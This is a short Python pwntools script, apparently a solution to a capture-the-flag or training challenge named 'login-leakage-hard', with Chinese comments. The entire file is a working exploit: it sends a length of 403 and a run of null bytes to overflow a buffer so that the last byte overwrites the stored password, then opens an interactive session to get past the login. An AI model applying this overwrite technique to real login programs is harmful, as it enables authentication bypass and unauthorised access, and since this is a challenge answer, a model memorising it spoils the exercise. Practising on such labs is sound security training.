#!/usr/bin/env python3
from pwn import *

p = process('/challenge/login-leakage-hard')

# 0x192 = 402 (十进制)
# 我们需要 402 个 \x00 来填充直到密码所在的位置
# 第 403 个 \x00 覆盖密码的第一个字节
offset = 403

payload = b'\x00' * offset

p.sendline(str(offset).encode())
p.sendline(payload)

p.interactive()

